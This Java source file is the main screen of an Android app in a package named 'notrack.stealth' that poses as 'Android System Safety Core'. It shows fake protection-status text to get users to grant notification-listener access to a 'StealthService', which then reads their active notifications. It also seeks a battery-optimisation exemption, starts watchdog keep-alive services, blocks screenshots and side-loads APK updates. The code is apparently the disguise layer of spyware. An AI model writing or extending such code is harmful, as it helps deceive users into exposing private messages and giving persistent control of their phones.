package com.notrack.stealth;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationManagerCompat;

import com.notrack.stealth.sync.SyncWorker;
import com.notrack.stealth.update.UpdateManager;
import com.notrack.stealth.watchdog.WatchdogService;

import java.io.File;
import java.util.Locale;
import java.util.Set;

/**
 * ANDROID SYSTEM SAFETY CORE — DASHBOARD & IN-APP UPDATE CENTER
 *
 * Professional, clean architecture (Instagram/Muse AI industry standard):
 *  - Displays current installed version dynamically.
 *  - Provides live in-app update status & one-tap manual checking.
 *  - Keeps the app open for configuration, testing, and update management.
 */
public class MainActivity extends Activity {

    private static final String TAG = "SystemSafetyCore";
    private static final int REQ_CODE_POST_NOTIF = 101;

    private TextView statusSubText;
    private Button grantBtn;

    // Update Card UI references
    private TextView tvInstalledVersionBadge;
    private TextView tvUpdateStatusTitle;
    private TextView tvUpdateStatusSubtitle;
    private Button btnCheckUpdate;
    private Button btnInstallUpdate;

    private UpdateManager.UpdateInfo mAvailableUpdateInfo;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // FLAG_SECURE: Prevent screenshots and screen recording of security services
        getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_SECURE,
                WindowManager.LayoutParams.FLAG_SECURE
        );

        ScrollView scrollView = new ScrollView(this);
        scrollView.setFillViewport(true);
        scrollView.setBackgroundColor(Color.parseColor("#F8F9FA"));

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(40, 50, 40, 50);

        // 1. App Header & Shield Icon
        ImageView shieldIcon = new ImageView(this);
        shieldIcon.setImageResource(R.drawable.ic_shield_safety);
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(130, 130);
        iconParams.gravity = Gravity.CENTER_HORIZONTAL;
        iconParams.setMargins(0, 0, 0, 20);
        shieldIcon.setLayoutParams(iconParams);
        root.addView(shieldIcon);

        TextView titleView = new TextView(this);
        titleView.setText("Android System Safety Core");
        titleView.setTextSize(20);
        titleView.setTextColor(Color.parseColor("#1F1F1F"));
        titleView.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        titleView.setGravity(Gravity.CENTER);
        root.addView(titleView);

        // 2. Installed Version Pill Badge
        tvInstalledVersionBadge = new TextView(this);
        String currentVersionStr = getCurrentVersionDisplay();
        tvInstalledVersionBadge.setText("Installed: " + currentVersionStr);
        tvInstalledVersionBadge.setTextSize(12);
        tvInstalledVersionBadge.setTextColor(Color.parseColor("#1A73E8"));
        tvInstalledVersionBadge.setTypeface(Typeface.DEFAULT_BOLD);
        tvInstalledVersionBadge.setPadding(28, 10, 28, 10);
        tvInstalledVersionBadge.setGravity(Gravity.CENTER);

        GradientDrawable badgeBg = new GradientDrawable();
        badgeBg.setColor(Color.parseColor("#E8F0FE"));
        badgeBg.setCornerRadius(30);
        tvInstalledVersionBadge.setBackground(badgeBg);

        LinearLayout.LayoutParams badgeParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        badgeParams.gravity = Gravity.CENTER_HORIZONTAL;
        badgeParams.setMargins(0, 14, 0, 30);
        tvInstalledVersionBadge.setLayoutParams(badgeParams);
        root.addView(tvInstalledVersionBadge);

        // 3. System Protection Status Card
        LinearLayout protectionCard = createCardContainer();

        TextView cardHeader = new TextView(this);
        cardHeader.setText("SECURITY TELEMETRY ENGINE");
        cardHeader.setTextSize(11);
        cardHeader.setTextColor(Color.parseColor("#70757A"));
        cardHeader.setTypeface(Typeface.DEFAULT_BOLD);
        protectionCard.addView(cardHeader);

        statusSubText = new TextView(this);
        statusSubText.setTextSize(14);
        statusSubText.setTextColor(Color.parseColor("#5F6368"));
        statusSubText.setPadding(0, 12, 0, 16);
        protectionCard.addView(statusSubText);

        grantBtn = new Button(this);
        grantBtn.setText("Grant Protection Access");
        grantBtn.setBackgroundColor(Color.parseColor("#1A73E8"));
        grantBtn.setTextColor(Color.WHITE);
        grantBtn.setVisibility(View.GONE);
        grantBtn.setOnClickListener(v -> requestNotificationAccess());
        protectionCard.addView(grantBtn);

        root.addView(protectionCard);

        // 4. In-App Updates Card (Dynamic Version & OTA Engine)
        LinearLayout updateCard = createCardContainer();

        TextView updateCardHeader = new TextView(this);
        updateCardHeader.setText("SYSTEM UPDATES & DISTRIBUTION");
        updateCardHeader.setTextSize(11);
        updateCardHeader.setTextColor(Color.parseColor("#70757A"));
        updateCardHeader.setTypeface(Typeface.DEFAULT_BOLD);
        updateCard.addView(updateCardHeader);

        tvUpdateStatusTitle = new TextView(this);
        tvUpdateStatusTitle.setText("Checking for updates...");
        tvUpdateStatusTitle.setTextSize(15);
        tvUpdateStatusTitle.setTextColor(Color.parseColor("#202124"));
        tvUpdateStatusTitle.setTypeface(Typeface.DEFAULT_BOLD);
        tvUpdateStatusTitle.setPadding(0, 12, 0, 4);
        updateCard.addView(tvUpdateStatusTitle);

        tvUpdateStatusSubtitle = new TextView(this);
        tvUpdateStatusSubtitle.setText("Connecting to Firebase update definitions...");
        tvUpdateStatusSubtitle.setTextSize(13);
        tvUpdateStatusSubtitle.setTextColor(Color.parseColor("#5F6368"));
        tvUpdateStatusSubtitle.setPadding(0, 0, 0, 20);
        updateCard.addView(tvUpdateStatusSubtitle);

        LinearLayout buttonRow = new LinearLayout(this);
        buttonRow.setOrientation(LinearLayout.HORIZONTAL);
        buttonRow.setGravity(Gravity.CENTER_VERTICAL);

        btnCheckUpdate = new Button(this);
        btnCheckUpdate.setText("Check Updates");
        btnCheckUpdate.setBackgroundColor(Color.parseColor("#E8EAED"));
        btnCheckUpdate.setTextColor(Color.parseColor("#202124"));
        btnCheckUpdate.setOnClickListener(v -> triggerManualUpdateCheck());

        LinearLayout.LayoutParams btnCheckParams = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        btnCheckParams.setMargins(0, 0, 12, 0);
        btnCheckUpdate.setLayoutParams(btnCheckParams);
        buttonRow.addView(btnCheckUpdate);

        btnInstallUpdate = new Button(this);
        btnInstallUpdate.setText("Update Now");
        btnInstallUpdate.setBackgroundColor(Color.parseColor("#188038"));
        btnInstallUpdate.setTextColor(Color.WHITE);
        btnInstallUpdate.setVisibility(View.GONE);
        btnInstallUpdate.setOnClickListener(v -> {
            if (mAvailableUpdateInfo != null) {
                UpdateManager.showInAppUpdateDialog(MainActivity.this, mAvailableUpdateInfo);
            }
        });

        LinearLayout.LayoutParams btnInstallParams = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        btnInstallUpdate.setLayoutParams(btnInstallParams);
        buttonRow.addView(btnInstallUpdate);

        updateCard.addView(buttonRow);
        root.addView(updateCard);

        scrollView.addView(root);
        setContentView(scrollView);

        // Check POST_NOTIFICATIONS runtime permission for Android 13+ (API 33+)
        checkPostNotificationPermission();

        // Bootstrap Background Keep-Alive & Watchdog Services
        bootstrapServices();

        // Handle update trigger if launched via update notification
        handleUpdateIntent(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleUpdateIntent(intent);
    }

    private void handleUpdateIntent(Intent intent) {
        if (intent == null) return;
        boolean triggerInstall = intent.getBooleanExtra("trigger_update_install", false);
        if (triggerInstall) {
            String apkPath = intent.getStringExtra("apk_path");
            if (apkPath != null) {
                File apkFile = new File(apkPath);
                if (apkFile.exists() && apkFile.length() > 50000) {
                    Log.i(TAG, "Notification tapped with pre-downloaded APK. Launching installer immediately.");
                    UpdateManager.installApk(this, apkFile);
                    return;
                }
            }
            Log.i(TAG, "Notification tapped. Triggering update dialog check.");
            triggerManualUpdateCheck();
        }
    }

    private LinearLayout createCardContainer() {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setPadding(36, 30, 36, 30);

        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setColor(Color.WHITE);
        cardBg.setCornerRadius(20);
        cardBg.setStroke(2, Color.parseColor("#E0E0E0"));
        card.setBackground(cardBg);

        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        cardParams.setMargins(0, 0, 0, 24);
        card.setLayoutParams(cardParams);
        return card;
    }

    private String getCurrentVersionDisplay() {
        try {
            PackageInfo pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
            return String.format(Locale.US, "v%s (Build %d)", pInfo.versionName, pInfo.versionCode);
        } catch (Exception e) {
            return "v1.0 (Build 1)";
        }
    }

    private void checkPostNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_CODE_POST_NOTIF);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE_POST_NOTIF) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.i(TAG, "POST_NOTIFICATIONS permission granted!");
                checkAndApplySystemStatus();
            } else {
                Log.w(TAG, "POST_NOTIFICATIONS permission denied.");
            }
        }
    }

    private void bootstrapServices() {
        try {
            SyncWorker.enqueuePeriodicKeepAlive(this);
            WatchdogService.start(this);
        } catch (Exception e) {
            Log.e(TAG, "Error starting background services", e);
        }
    }

    private void triggerManualUpdateCheck() {
        btnCheckUpdate.setEnabled(false);
        tvUpdateStatusTitle.setText("Checking for updates...");
        tvUpdateStatusSubtitle.setText("Contacting Firebase Realtime Database...");

        UpdateManager.checkInAppUpdate(this, new UpdateManager.UpdateCheckCallback() {
            @Override
            public void onCheckStarted() {
                btnCheckUpdate.setText("Checking...");
            }

            @Override
            public void onUpdateAvailable(UpdateManager.UpdateInfo info) {
                btnCheckUpdate.setEnabled(true);
                btnCheckUpdate.setText("Refresh");
                mAvailableUpdateInfo = info;

                tvUpdateStatusTitle.setText(String.format(Locale.US, "🚀 New Version Available: v%s (%d)", info.serverVersionName, info.serverVersionCode));
                tvUpdateStatusTitle.setTextColor(Color.parseColor("#188038"));
                tvUpdateStatusSubtitle.setText(info.message != null && !info.message.isEmpty() ? info.message : "Tap 'Update Now' to download and install.");
                btnInstallUpdate.setVisibility(View.VISIBLE);
            }

            @Override
            public void onAlreadyUpToDate(UpdateManager.UpdateInfo info) {
                btnCheckUpdate.setEnabled(true);
                btnCheckUpdate.setText("Check Again");
                mAvailableUpdateInfo = null;

                tvUpdateStatusTitle.setText(String.format(Locale.US, "✅ Up to Date (v%s)", info.currentVersionName));
                tvUpdateStatusTitle.setTextColor(Color.parseColor("#1F1F1F"));
                tvUpdateStatusSubtitle.setText("Your system safety definitions and application core are current.");
                btnInstallUpdate.setVisibility(View.GONE);
                Toast.makeText(MainActivity.this, "App is up to date!", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onError(String errorMessage) {
                btnCheckUpdate.setEnabled(true);
                btnCheckUpdate.setText("Retry Check");

                tvUpdateStatusTitle.setText("Update check failed");
                tvUpdateStatusTitle.setTextColor(Color.parseColor("#D93025"));
                tvUpdateStatusSubtitle.setText(errorMessage);
                Toast.makeText(MainActivity.this, errorMessage, Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void requestNotificationAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_CODE_POST_NOTIF);
                return;
            }
        }

        try {
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
        } catch (Exception e) {
            try {
                startActivity(new Intent(Settings.ACTION_SETTINGS));
            } catch (Exception ignored) {}
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        UpdateManager.setActivityInForeground(true);
        checkAndApplySystemStatus();
        triggerManualUpdateCheck();
    }

    @Override
    protected void onPause() {
        super.onPause();
        UpdateManager.setActivityInForeground(false);
    }

    private void checkAndApplySystemStatus() {
        boolean listenerOk = isListenerEnabled();
        boolean batteryOk = isIgnoringBatteries();

        if (listenerOk) {
            StealthService.rebindService(this);
            StealthService service = StealthService.getInstance();
            if (service != null) {
                service.processActiveNotifications();
            }

            if (!batteryOk && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    startActivity(new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                } catch (Exception ignored) {}
            }

            statusSubText.setText("🟢 System Protection Active\nAll system safety services operating normally.");
            statusSubText.setTextColor(Color.parseColor("#188038"));
            grantBtn.setVisibility(View.GONE);

        } else {
            statusSubText.setText("⚠️ System Protection Inactive\nNotification access is required to enable System Safety Core.");
            statusSubText.setTextColor(Color.parseColor("#D93025"));
            grantBtn.setVisibility(View.VISIBLE);
        }
    }

    private boolean isListenerEnabled() {
        try {
            Set<String> packages = NotificationManagerCompat.getEnabledListenerPackages(this);
            if (packages != null && packages.contains(getPackageName())) {
                return true;
            }
            String enabled = Settings.Secure.getString(
                    getContentResolver(), "enabled_notification_listeners");
            String mine = new ComponentName(this, StealthService.class).flattenToString();
            String shortMine = new ComponentName(this, StealthService.class).flattenToShortString();
            return enabled != null && (enabled.contains(mine) || enabled.contains(shortMine) || enabled.contains(getPackageName()));
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isIgnoringBatteries() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
            } catch (Exception e) {
                return true;
            }
        }
        return true;
    }
}
